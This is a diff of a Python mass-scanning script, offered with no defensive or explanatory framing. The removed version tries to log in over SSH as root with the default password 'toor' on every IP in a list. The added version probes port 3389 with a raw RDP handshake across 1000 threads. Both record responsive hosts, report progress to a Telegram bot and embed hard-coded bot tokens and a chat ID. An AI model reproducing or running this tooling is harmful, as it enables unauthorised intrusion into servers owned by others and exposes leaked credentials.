@@ -1,66 +1,73 @@
-import paramiko
 import socket
-import threading
-from concurrent.futures import ThreadPoolExecutor
 import time
+import threading
 import requests
+from concurrent.futures import ThreadPoolExecutor
 
 INPUT_FILE = 'ip.txt'
-OUTPUT_FILE = 'live_ssh_verified.txt'
-USERNAME = 'root'
-PASSWORD = 'toor'
-BOT_TOKEN = '7691507387:AAEl81yaGi3Te1KOqOtBqPahu_fjzXljQs4'
+OUTPUT_FILE = 'live_rdp_verified.txt'
+PORT = 3389
+TIMEOUT = 3
+
+BOT_TOKEN = '7489463491:AAEM8-TBUkxRIINHWjjQj0Fkp9A7B5th5hg'
 CHAT_ID = '5326706151'
 
-live_count = 0
-bad_count = 0
+RDP_HANDSHAKE = bytes.fromhex('030000130ee000000000000100080003000000')
+
+# Stats
+total = 0
+scanned = 0
+good = 0
+fail = 0
+
 lock = threading.Lock()
 
-def is_ssh_accessible(ip):
-    global live_count, bad_count
+def is_real_rdp(ip):
     try:
-        sock = socket.socket()
-        sock.settimeout(3)
-        sock.connect((ip, 22))
-        sock.close()
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(TIMEOUT)
+            s.connect((ip, PORT))
+            s.sendall(RDP_HANDSHAKE)
+            data = s.recv(16)
+            return data and data.startswith(b'\x03\x00')
     except:
-        with lock:
-            bad_count += 1
-        return
+        return False
 
-    try:
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh.connect(ip, port=22, username=USERNAME, password=PASSWORD, timeout=5)
+def check_and_save(ip):
+    global scanned, good, fail
+    if is_real_rdp(ip):
         with lock:
-            live_count += 1
-            print(f"[+] SSH FOUND: {ip}")
-            with open(OUTPUT_FILE, 'a') as f:
-                f.write(f"{ip}\n")
-        ssh.close()
-    except:
+            good += 1
+            with open(OUTPUT_FILE, 'a+') as f:
+                f.seek(0)
+                if ip not in f.read():
+                    f.write(ip + '\n')
+    else:
         with lock:
-            bad_count += 1
+            fail += 1
+    with lock:
+        scanned += 1
 
-def send_telegram_update():
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+def send_status_to_telegram():
     while True:
         time.sleep(120)  # Every 2 minutes
-        total = live_count + bad_count
-        message = f"SCANNED: {total}\nGOOD: {live_count}\nBAD: {bad_count}\nTOTAL: {total}"
-        try:
-            requests.post(url, data={'chat_id': CHAT_ID, 'text': message})
-            print("[Update] Sent to Telegram.")
-        except Exception as e:
-            print(f"[Error] Telegram send failed: {e}")
+        with lock:
+            msg = f"TOTAL : {total}\nSCANNED : {scanned}\nGOOD : {good}\nFAIL : {fail}"
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
+            'chat_id': CHAT_ID,
+            'text': msg
+        })
 
 def main():
-    threading.Thread(target=send_telegram_update, daemon=True).start()
+    global total
     with open(INPUT_FILE, 'r') as f:
         ips = [line.strip() for line in f if line.strip()]
+    total = len(ips)
 
-    with ThreadPoolExecutor(max_workers=100) as executor:
-        executor.map(is_ssh_accessible, ips)
+    threading.Thread(target=send_status_to_telegram, daemon=True).start()
+
+    with ThreadPoolExecutor(max_workers=1000) as executor:
+        executor.map(check_and_save, ips)
 
 if __name__ == '__main__':
     main()
